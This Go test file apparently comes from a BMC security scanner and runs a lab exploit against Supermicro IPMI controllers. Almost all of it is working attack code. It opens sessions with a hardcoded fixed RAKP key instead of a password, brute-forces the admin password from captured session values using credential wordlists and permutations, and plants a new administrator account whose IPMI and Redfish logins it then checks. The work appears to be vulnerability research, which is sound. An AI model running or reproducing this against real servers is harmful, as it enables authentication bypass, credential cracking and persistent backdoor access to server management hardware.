package ipmi

import (
	"bytes"
	"context"
	crand "crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/runZeroInc/oobscan/pkg/creds"
)

func execExpectOK(s *Session20, netfn, cmd byte, req []byte) error {
	cc, _, err := s.Exec(netfn, cmd, req)
	if err != nil {
		return err
	}
	if cc != 0x00 {
		return fmt.Errorf("cc=0x%02x", cc)
	}
	return nil
}

func setUserName16(s *Session20, uid byte, name string) error {
	buf := make([]byte, 17)
	buf[0] = uid
	copy(buf[1:], []byte(name))
	return execExpectOK(s, NetFnApp, CmdSetUserName, buf)
}

func setUserPassword16(s *Session20, uid byte, op byte, password string) error {
	req := []byte{uid, op}
	if op == 0x02 || op == 0x03 {
		pw := make([]byte, 16)
		copy(pw, []byte(password))
		req = append(req, pw...)
	}
	return execExpectOK(s, NetFnApp, CmdSetUserPassword, req)
}

func setUserAccessBestEffort(s *Session20, ch, uid, priv byte) error {
	chVariants := []byte{ch, byte(ch | 0x80), byte(ch | 0x40), byte(ch | 0xc0)}
	accessVariants := []byte{
		byte(0x30 | (priv & 0x0f)),
		byte(0x34),
		byte(0x70 | (priv & 0x0f)),
		byte(0x74),
		byte(0x3f),
	}
	reqs := make([][]byte, 0, len(chVariants)*len(accessVariants))
	for _, c := range chVariants {
		for _, a := range accessVariants {
			reqs = append(reqs, []byte{c, uid, a, 0x00})
		}
	}
	var last error
	for _, req := range reqs {
		if err := execExpectOK(s, NetFnApp, CmdSetUserAccess, req); err != nil {
			last = err
			continue
		}
		cc, d, err := s.Exec(NetFnApp, CmdGetUserAccess, []byte{ch, uid})
		if err == nil && cc == 0x00 && len(d) >= 4 {
			acc := d[3]
			if (acc&0x0f) == (priv&0x0f) && (acc&0x30) == 0x30 {
				return nil
			}
		}
	}
	if last == nil {
		last = fmt.Errorf("no user-access request attempted")
	}
	return last
}

func tryIPMILogin(host, username, password string, suites []int, timeout time.Duration) (int, byte, int, error) {
	for _, sid := range suites {
		ca, ok := CipherAlgosFor(sid)
		if !ok {
			continue
		}
		s, err := OpenSession20(host, 623, username, password, ca, timeout)
		if err != nil {
			continue
		}
		cc, data, err := s.Exec(NetFnApp, CmdGetDeviceID, nil)
		s.Close()
		if err == nil && cc == 0x00 && len(data) > 0 {
			return sid, cc, len(data), nil
		}
	}
	return 0, 0, 0, fmt.Errorf("all suites failed")
}

func redfishLoginChecks(host, username, password string, timeout time.Duration) (int, bool, int, string) {
	client := &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	body, _ := json.Marshal(map[string]string{"UserName": username, "Password": password})
	req, _ := http.NewRequest(http.MethodPost, "https://"+host+"/redfish/v1/SessionService/Sessions", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return 0, false, 0, err.Error()
	}
	defer resp.Body.Close()
	token := strings.TrimSpace(resp.Header.Get("X-Auth-Token"))
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 256))

	rootReq, _ := http.NewRequest(http.MethodGet, "https://"+host+"/redfish/v1/", nil)
	rootReq.SetBasicAuth(username, password)
	rootResp, rootErr := client.Do(rootReq)
	rootStatus := 0
	if rootErr == nil {
		rootStatus = rootResp.StatusCode
		rootResp.Body.Close()
	}
	return resp.StatusCode, token != "", rootStatus, strings.TrimSpace(string(b))
}

func openSMCRAKPSessionCaptured(host string, port int, username string, secret []byte, suite CipherAlgos, timeout time.Duration) (*Session20, []byte, []byte, error) {
	c, err := NewClient(host, port, timeout)
	if err != nil {
		return nil, nil, nil, err
	}
	handshakeRetries := session20HandshakeRetries(timeout)
	cmdRetries := session20CommandRetries(timeout)

	var cSID uint32
	_ = binary.Read(crand.Reader, binary.LittleEndian, &cSID)
	if cSID == 0 {
		cSID = 0xa0a2a3a4
	}
	cRand := make([]byte, 16)
	if _, err := crand.Read(cRand); err != nil {
		c.Close()
		return nil, nil, nil, err
	}

	var osReq bytes.Buffer
	osReq.WriteByte(0x00)
	osReq.WriteByte(0x04)
	osReq.Write([]byte{0x00, 0x00})
	_ = binary.Write(&osReq, binary.LittleEndian, cSID)
	osReq.Write([]byte{0x00, 0x00, 0x00, 0x08, suite.Auth, 0, 0, 0})
	osReq.Write([]byte{0x01, 0x00, 0x00, 0x08, suite.Integrity, 0, 0, 0})
	osReq.Write([]byte{0x02, 0x00, 0x00, 0x08, suite.Conf, 0, 0, 0})

	osResp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadOpenSessionReq, 0, 0, osReq.Bytes()), handshakeRetries)
	if err != nil {
		c.Close()
		return nil, nil, nil, fmt.Errorf("open-session: %w", err)
	}
	bmcSID, err := parseOpenSessionResp(osResp)
	if err != nil {
		c.Close()
		return nil, nil, nil, err
	}

	var r1 bytes.Buffer
	r1.WriteByte(0x00)
	r1.Write([]byte{0, 0, 0})
	_ = binary.Write(&r1, binary.LittleEndian, bmcSID)
	r1.Write(cRand)
	r1.WriteByte(0x14)
	r1.Write([]byte{0, 0})
	r1.WriteByte(byte(len(username)))
	r1.WriteString(username)

	r2Resp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadRAKP1, 0, 0, r1.Bytes()), handshakeRetries)
	if err != nil {
		c.Close()
		return nil, nil, nil, fmt.Errorf("rakp1: %w", err)
	}
	res := &RAKPResult{Username: username, AuthAlgo: suite.Auth, IntegrityAlgo: suite.Integrity, ConfAlgo: suite.Conf, ClientSID: cSID, BMCSID: bmcSID, ClientRand: cRand}
	if err := parseRAKP2(r2Resp, res); err != nil {
		c.Close()
		return nil, nil, nil, err
	}

	kec := []byte(nil)
	if suite.Auth != RAKPNone {
		kec = rakpKEC3ByAlgoKey(suite.Auth, secret, res.BMCRand, cSID, 0x14, username)
	}
	var r3 bytes.Buffer
	r3.WriteByte(0x00)
	r3.WriteByte(0x00)
	r3.Write([]byte{0, 0})
	_ = binary.Write(&r3, binary.LittleEndian, bmcSID)
	r3.Write(kec)

	r4Resp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadRAKP3, 0, 0, r3.Bytes()), handshakeRetries)
	if err != nil {
		c.Close()
		return nil, nil, nil, fmt.Errorf("rakp3: %w", err)
	}
	p, err := rmcpPlusPayload(r4Resp)
	if err != nil {
		c.Close()
		return nil, nil, nil, err
	}
	if len(p) < 2 || p[1] != 0x00 {
		c.Close()
		if len(p) >= 2 {
			return nil, nil, nil, fmt.Errorf("rakp4 status=0x%02x", p[1])
		}
		return nil, nil, nil, fmt.Errorf("short RAKP4")
	}

	s := &Session20{
		client:     c,
		host:       host,
		port:       port,
		timeout:    timeout,
		cmdRetries: cmdRetries,
		username:   username,
		password:   "<smcrakp-fixed-key>",
		suite:      suite,
		consoleSID: cSID,
		bmcSID:     bmcSID,
		seq:        1,
		rqSeq:      1,
	}
	s.sik, s.k1, s.k2 = deriveSessionKeys(suite.Auth, secret, cRand, res.BMCRand, username)
	return s, cRand, res.BMCRand, nil
}

func TestSMCRAKPLabFromRemote(t *testing.T) {
	if os.Getenv("RUN_SMCRAKP_LAB") != "1" {
		t.Skip("set RUN_SMCRAKP_LAB=1 to run")
	}
	host := os.Getenv("SMCRAKP_HOST")
	if host == "" {
		host = "192.0.2.45"
	}
	user := os.Getenv("SMCRAKP_USER")
	if user == "" {
		user = "ADMIN"
	}
	adminPass := os.Getenv("SMCRAKP_ADMIN_PASS")
	if adminPass == "" {
		adminPass = "SomeDefaultPassword2025!"
	}
	timeout := 3 * time.Second
	key, err := hex.DecodeString("fab979d849be933dd0c41fd2c9d77a30aa8d3f50")
	if err != nil {
		t.Fatalf("decode key: %v", err)
	}

	t.Log("[1] Validate suite 15/16 viability with fixed key")
	for _, sid := range []int{15, 16} {
		ca, ok := CipherAlgosFor(sid)
		if !ok {
			t.Logf("suite=%d unavailable in mapping", sid)
			continue
		}
		s, err := OpenSession20WithKey(host, 623, user, key, ca, timeout)
		if err != nil {
			t.Logf("suite=%d open_fail: %v", sid, err)
			continue
		}
		cc, data, err := s.Exec(NetFnApp, CmdGetDeviceID, nil)
		s.Close()
		if err != nil {
			t.Logf("suite=%d cmd_fail: %v", sid, err)
		} else {
			t.Logf("suite=%d cmd_ok cc=0x%02x dataLen=%d", sid, cc, len(data))
		}
	}

	t.Log("[2] In-session brute force of session keys after SMCRAKP session open (suite 8)")
	ca8, _ := CipherAlgosFor(8)
	s, cRand, bRand, err := openSMCRAKPSessionCaptured(host, 623, user, key, ca8, timeout)
	if err != nil {
		t.Fatalf("open captured session suite8: %v", err)
	}
	defer s.Close()
	s.client.Timeout = 250 * time.Millisecond
	s.cmdRetries = 1

	candidates := make([]string, 0, 260)
	seenPw := map[string]struct{}{}
	addPw := func(p string) {
		p = strings.TrimSpace(p)
		if p == "" {
			return
		}
		if _, ok := seenPw[p]; ok {
			return
		}
		seenPw[p] = struct{}{}
		candidates = append(candidates, p)
	}
	for _, p := range []string{adminPass, "ADMIN", "SomeDefaultPassword2025", "SomeDefaultPassword2025!"} {
		addPw(p)
	}
	for _, c := range creds.CredsFor("supermicro", creds.ClassIPMI) {
		addPw(c.Password)
	}
	for _, p := range creds.Passwords() {
		addPw(p)
	}
	for _, seed := range creds.CommonPasswordSeeds {
		creds.Permute(seed, true, func(v string) bool {
			addPw(v)
			return false
		})
	}

	good := -1
	for i, p := range candidates {
		sik, k1, k2 := deriveSessionKeysWithRole(s.suite.Auth, []byte(p), cRand, bRand, 0x14, user)
		s.sik, s.k1, s.k2 = sik, k1, k2
		cc, data, err := s.exec(NetFnApp, CmdGetDeviceID, nil)
		if err == nil && cc == 0x00 && len(data) > 0 {
			good = i
			t.Logf("session-key hit index=%d password=%q cc=0x%02x dataLen=%d", i, p, cc, len(data))
			break
		}
	}
	if good < 0 {
		t.Fatalf("no candidate produced valid in-session response")
	}

	ca3, _ := CipherAlgosFor(3)
	recheck, err := OpenSession20(host, 623, user, adminPass, ca3, timeout)
	if err != nil {
		t.Logf("post-bruteforce re-login failed (possible lockout/rate-limit or bad password): %v", err)
	} else {
		cc, data, err := recheck.Exec(NetFnApp, CmdGetDeviceID, nil)
		recheck.Close()
		if err != nil || cc != 0x00 || len(data) == 0 {
			t.Logf("post-bruteforce command failed cc=0x%02x err=%v dataLen=%d", cc, err, len(data))
		} else {
			t.Logf("post-bruteforce re-login OK cc=0x%02x dataLen=%d", cc, len(data))
		}
	}

	t.Log("[3] Custom combo (auth=0x01 integ=0x00 conf=0x01) with wrong-bit key vs valid key")
	combo := CipherAlgos{Suite: 99, Auth: RAKPHMACSHA1, Integrity: IntegrityNone, Conf: ConfAESCBC}
	wrong := append([]byte(nil), key...)
	wrong[0] ^= 0x01

	_, err = OpenSession20WithKey(host, 623, user, wrong, combo, timeout)
	if err != nil {
		t.Logf("combo wrong-key open_fail: %v", err)
	} else {
		t.Logf("combo wrong-key open_ok")
	}

	v, err := OpenSession20WithKey(host, 623, user, key, combo, timeout)
	if err != nil {
		t.Logf("combo valid-key open_fail: %v", err)
	} else {
		cc, data, err := v.Exec(NetFnApp, CmdGetDeviceID, nil)
		v.Close()
		if err != nil {
			t.Logf("combo valid-key cmd_fail: %v", err)
		} else {
			t.Logf("combo valid-key cmd_ok cc=0x%02x dataLen=%d", cc, len(data))
		}
	}

	t.Log("[4] Add SomeDefaultUser user (admin) then test login via IPMI/Redfish")
	ca1, _ := CipherAlgosFor(1)
	adminSess, err := OpenSession20WithKey(host, 623, user, key, ca1, timeout)
	if err != nil {
		t.Logf("task4 session open failed: %v", err)
		return
	}
	defer adminSess.Close()

	usersBefore, err := collectUsers(context.Background(), adminSess)
	if err != nil {
		t.Logf("task4 collect users before failed: %v", err)
		return
	}
	slot := 0
	for _, u := range usersBefore {
		if u.Name == "SomeDefaultUser" {
			slot = u.ID
			break
		}
	}
	if slot == 0 {
		for _, u := range usersBefore {
			if strings.TrimSpace(u.Name) == "" && u.ID > 2 {
				slot = u.ID
				break
			}
		}
	}
	if slot == 0 {
		t.Logf("task4 no free slot found")
		return
	}
	t.Logf("task4 selected slot id=%d", slot)

	if err := setUserName16(adminSess, byte(slot), "SomeDefaultUser"); err != nil {
		t.Logf("task4 set username failed: %v", err)
		return
	}
	if err := setUserPassword16(adminSess, byte(slot), 0x02, "SomeDefaultUser2025"); err != nil {
		t.Logf("task4 set password failed: %v", err)
		return
	}
	if err := setUserPassword16(adminSess, byte(slot), 0x01, ""); err != nil {
		t.Logf("task4 enable user failed: %v", err)
	}
	ch := selectLANChannel(context.Background(), adminSess)
	if err := setUserAccessBestEffort(adminSess, ch, byte(slot), 0x04); err != nil {
		t.Logf("task4 set access warning: %v", err)
	}

	usersAfter, err := collectUsers(context.Background(), adminSess)
	if err == nil {
		for _, u := range usersAfter {
			if u.ID == slot {
				t.Logf("task4 slot=%d name=%q priv=%s enabled=%t ipmi=%t link=%t raw=%s", u.ID, u.Name, u.Priv, u.Enabled, u.IPMIAuth, u.LinkAuth, u.Raw)
				ccAcc, dAcc, errAcc := adminSess.Exec(NetFnApp, CmdGetUserAccess, []byte{ch, byte(slot)})
				if errAcc == nil && ccAcc == 0x00 && len(dAcc) >= 4 {
					acc := dAcc[3]
					t.Logf("task4 slot=%d access_byte=0x%02x priv_num=%d ipmi=%t link=%t callin=%t", slot, acc, acc&0x0f, (acc&0x10) != 0, (acc&0x20) != 0, (acc&0x40) == 0)
				}
				break
			}
		}
	}

	sid, cc, dataLen, err := tryIPMILogin(host, "SomeDefaultUser", "SomeDefaultUser2025", []int{3, 1, 6, 8}, timeout)
	if err != nil {
		t.Logf("task4 IPMI login failed: %v", err)
	} else {
		t.Logf("task4 IPMI login OK suite=%d cc=0x%02x dataLen=%d", sid, cc, dataLen)
	}

	sessionStatus, hasToken, rootStatus, bodySnippet := redfishLoginChecks(host, "SomeDefaultUser", "SomeDefaultUser2025", 5*time.Second)
	t.Logf("task4 Redfish session_status=%d token=%t root_status=%d body=%q", sessionStatus, hasToken, rootStatus, bodySnippet)
}
